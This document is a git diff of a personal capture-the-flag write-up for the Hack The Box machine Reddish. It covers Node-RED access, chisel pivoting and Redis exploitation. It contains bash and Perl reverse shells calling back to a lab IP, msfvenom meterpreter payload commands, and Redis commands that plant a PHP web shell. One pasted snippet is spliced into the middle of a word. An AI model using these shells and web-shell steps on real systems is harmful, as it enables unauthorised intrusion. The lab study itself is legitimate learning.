@@ -18,7 +18,10 @@ Learnt:
 5. Manual (Heard but not tried till now) Go Programs by using ldflags and upx packing from 10Mb to 3Mb!
 6. Power of chisel only.
 7. Excalidraw is time consuming compare to pen and paper but looks good, I guess I'll add a drawing pad to eventually one day shop list 
-8. Favicons were a large part of 
+8. Favicons were a larger indication of where I am capable of expanding further intuitively as it boils down too:
+	1. What is in front of you - what can I use to solve X - not what could be in front of you 
+	2. What sticks out on a blank screen with Favicon and response error code.
+9. The power of `nohup`  or no hangup and `&` 
 Beyond Root:
 - Omni-Tool-Usage for port redirection - but demostrate with Ubuntu server for tools cannot just install onto the box 
 - Clarity over all possible options 
@@ -58,8 +61,9 @@ Day 2: returned it generate a new `b1a51218f30da47d4f45b52972804d1a`
 Day 3: After along time away: `695613754dfef3f53a0b18b02d805047`
 Day 4: After some practice elsewhere
 Day 5-7: `c811816e50d58bd34204067b8ba3ae80`
+Day 8: `13492c3c28a60b2a4a00971f3c9a6629`
 
-As of Day 5-7; I have learn so much as to why my approaches were good
+As of Day 5-8; I have learn so much as to why my approaches were good
 1. Manual combing the with burp site and asking questions is really good
 1. Given time limits I was and set myself to try to expand my experience of different possiblities of problem, rushing and missing the key seems so silly, but indicative of me stress testing to push my brain to make me care a  great deal about hacking and solving boxes 
 	- Neurologically very important
@@ -111,7 +115,7 @@ First one and half is a half and then get two for the two is one reverse shell r
 1. `bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'`
 2. Perl is on the box:
 ```bash
-perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="10.10.14.123";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 [Reading 0xDF try various functionality of the NodeRed application](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#code-execution--shell-in-node-red), I decided that an additional beyond root would be to do the same and the highest goal being to try to create a proxy via the NodeRED. In the beyond root section I will outline a proxy and other stuff both 0xdf and atleast one idea if I do not complete a proxy.
@@ -147,7 +151,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.132/8002 0>&1' &
 # Beware it does not auto update fields!
 msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.132 LPORT=4444 --platform linux -a x64 -n 200 -e cmd/generic_sh -i 4 -f elf -o rshell
 
-msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.132; set LPORT 4444; run"
+msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.123; set LPORT 4444; run"
 
 nc -lvnp  9696 < met
 # On Node RED:
@@ -215,7 +219,7 @@ Oneliner versions
 ![](pingsweepresult.png)
 
 Identifying other boxes on the network.
-- arp cache for Ipv4 resolution
+- arp cache for IPv4 resolution
 
 Oxdf better one liners 
 ```bash
@@ -264,18 +268,17 @@ Improved cli
 targetIP= # the IP we want to target only accessible from nodered.
 targetPORT= # the port we what to view from the portscan
 
-./chisel client 10.10.14.132:9000 R127.0.0.1:9001:$targetIP:$targetPORT
+./chisel client 10.10.14.132:9000 R:127.0.0.1:9001:$targetIP:$targetPORT
 proxychains nmap -sT -F 
 ```
 
 
 You could also do the same with the telling the entire subnet that nmap is being used with [naabu](https://github.com/projectdiscovery/naabu)  `-proxy string`  with socks5 proxy `(ip[:port] / fqdn[:port])`. From hellscape of the [[Squid-Helped-through]] machine where I hit the hard wall finding the proxy, but experiementing with what can and cannot be tunnelled.
 
-
-
 Burpsuite socks proxy
 ![](proxyburpproxyception.png)
 
+Through burpsuite 
 ![](reddishwebpage.png)
 
 Ippsec points out a security risk being that if listening on 0.0.0.0 then is directly accessible by anyone. One thing not pointed out by either Ippsec or 0xDF is that with nikto scan it find a info.php page containing alots of information as it is phpinfo(). Most importantly: `Linux www 4.4.0-130-generic #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018 x86_64`
@@ -288,6 +291,8 @@ chisel client 10.10.10.10:8000 R:127.0.0.1:8001:172.19.0.3:80
 ![](webpagefunction.png)
 Some checks urls
 ![](forbiddencodedfolder.png)
+
+hits 
 ![](hits.png)
 
 Ippsec provides justification based on the details in the code that there is database. Therefore on the network interface IP could be docker containers, database and the `http://172.19.0.3/` being the webserver. 
@@ -331,14 +336,111 @@ https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
 
 https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#pivoting
 
+## Returning Day 8 to Redis
+
+The intial first four days for attempts got all the pieces ready for me, but as a remediation against step over issues  that I have overcome over months of other boxes and research.  
+
+Chiselling to box
+![](day8chiseltoredis.png)
+A breakdown of this to really hammer home everything I have learnt over the last 6 months:
+```bash
+# First client to connect to a server
+chisel client $serverIP:$serverPort
+# Server is configured for reverse with -reverse 
+# Therefore the syntax is R: for reverse
+# Serving the traffic TO localhost and port
+R:$localhostIPv4:$locahostPort: # :...
+# ...:
+:172.19.0.2:6379 # The address and port to reverse port forward traffic so that it is visible from 
+# $localhost:$localPort
+```
+We are reversing - ie using the NodeRED box to send traffic that only it can reach to a chisel-server that can serve the traffic to us. Port redirection locally would be if we were using a client from our machine. Dynamic port redirection would be that we can access any address and port behind the NodeRED from one server ie .4, .3 and .2 addresses.
+
+nmap as proof
+![](nmapredisthroughrevportfwdproof.png)
+
+Following along with Ippsec till we have a shell he demonstrates [Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html). 
+Firstly the article is suggesting to check if we can access the instance
+```bash
+nc localhost 6379
+# We provide:
+echo "Hey no AUTH required!"
+```
+We get back:
+![](redisechoheynoauthrequired.png)
+Therefore we can access it and the article then explain that...*"no AUTH required. Redis is unprotected without a password set up"*
+
+It then suggest to create an ssh key, but we do not have ssh on the box and prosumably the redis box does not either. This is similar to the real world cloud environments where sysadmin should have only just in time access to the machines that do not need ssh, rdp - ask yourself should a container really need ssh after configuration. The anwser is no, we can redeploy the updated version of the machine as it is infrastructure as code being a docker container. Ippsec discuss the enumeration of connection between database and the web application.
+
+For hits to be reflected on the page we both the web app, the database and the `ajax.php?test=` top connect the two. Testing how those interact is important.
+
+- How do the applications and services running connect?
+	- If they connect i.e web-app has URI that queries database, using the URI what can be done to both services - commands, api calls, etc?
+
+Following along with Ippsec or the article
+```bash
+$ redis-cli -h 192.168.1.11 flushall$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackitLooks good. How to dump our memory content into the authorized_keys file? That’skinda trivial.
+
+$ redis-cli -h 192.168.1.11192.168.1.11:6379> config set dir /Users/antirez/.ssh/OK192.168.1.11:6379> config get dir1) "dir"2) "/Users/antirez/.ssh"192.168.1.11:6379> config set dbfilename "authorized_keys"OK192.168.1.11:6379> saveOK
+```
+
+WE need to use [FLUSHALL](https://redis.io/commands/flushall/)
+```bash
+# Delete all the keys of all the existing databases, not just the currently selected one. This command never fails.
+flushall [ASYNC | SYNC]
+```
+
+The rationale behind the last three lines are before the comment... woops.
+1. We need a web shell, that written in php 
+2. To do such that it can be accessed by the webpage from redis we tell redis to
+3. have some content we call `subscribetoippsec` populating the string with a web shell 
+4. then tell redis the filename to be served by the webpage call cmd.php
+5. then where that file should stored
+6. the flushall will flush all the keys and values that we are providing over netcat that may exist in memory 
+```bash
+nc localhost 6379 
+flushall
+set subscribetoippsec "<? system($_REQUEST['cmd']); ?>"
+config set dbfilename cmd.php
+config set dir /var/www/html
+# Then do not be an idiot and save it...
+save
+```
+
+We need another shell for Day 8 and something I realised was is that the inital shell with `[object Object]` can make more shells. This seems CTFy  `nohup` and `&` with both I discover from [hexadix](https://hexadix.com/use-nohup-execute-commands-background-keep-running-exit-shell-promt/) so I could also now do the same with meterpreter for the metasploit `portfwd` command with `meterpreter`
+![](chiselisnowajob.png)
+
+Then I need to reconfigure burpsuite for a SOCKs proxy, returning to redo the webshell that I never saved...
+![](pittytheunsavedfool.png)
+Making sure to name the file correctly....and subscribe to ippsec harder
+![](subscribetoippsecharder.png)
+
+File is there
+
+![](flabberghaster.png)
+
+Burpsuite was irrating me, also reddish I need to keep the connection open as it is in the cache of redis.
+![](burpisirratingme.png)
+
+Ippsec and 0xDF initally check the networking in prioritising pre reverse shell. Ping will not return back. This is were I am completely unknown territory as to pivoting through. [[Hololive-Writeup]] has some of this, but through C2s so multiple manual approaches is now an additional requirement for my beyond rooting of this box. 
+
+Also to make matter worse/better (in that I do not have to cleanup afterward) the Server also cleans up so we have continuously create the web shell. Also burpsuites URL encoding is a kicker where I need both to work for some time.. Also learnt how to add the video into markdown. 
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/Yp4oxoQIBAM" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+
+
+Instead I am going to watch the xct and ippsec version of their writeups for the Anubis machine as it pivot through a container with chisel and proxychains and burp for one day forgetting all the steps and doing the box without any real idea of the box for: [[Anubis-Writeup]]
+
 ## PrivEsc
 
       
 ## Beyond Root
 
 
-#### Omni-Tooling
 
+
+
+#### Omni-Tooling - Port Redirection
 https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
 https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
 - sshuttle
@@ -350,10 +452,24 @@ Back to Reddish
 - `meterpreter portfwd` with  0xDF instructions:
 1.  Get a meterpreter session with nodered, and use the `portfwd` capability to tunnel from my local box into the network (like ssh tunneling).
 
+#### Omni-Tooling - Pivoting through a network
+
+We do not have access to some parts of this box
+[0xdf uses SOCAT](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#www--redis-containers) 
+
+1
 
 #### Use Node RED to understand Virtual networking 
 
-3.  Build a listening interface (likely web) with NodeRed, and use that to tunnel traffic.
+3.  Build a listening interAnd quick bash script to go back add the video to each as a iframe
+```bash
+
+YOUTUBEVIDID=
+# 
+echo ""
+<iframe width="560" height="315" src="https://www.youtube.com/embed/$YOUTUBEVIDID" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+
+```face (likely web) with NodeRed, and use that to tunnel traffic.
 
 https://nodered.org/docs/user-guide/
 
@@ -392,4 +508,15 @@ exec (payload)->  Switch ->
 				return invalid command payload
 
 tcp-request - set with msg.host, msg.port
+```
+
+
+#### And quick bash script to go back add the video to each as a iframe
+```bash
+
+YOUTUBEVIDID=
+# 
+echo ""
+<iframe width="560" height="315" src="https://www.youtube.com/embed/$YOUTUBEVIDID" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+
 ```
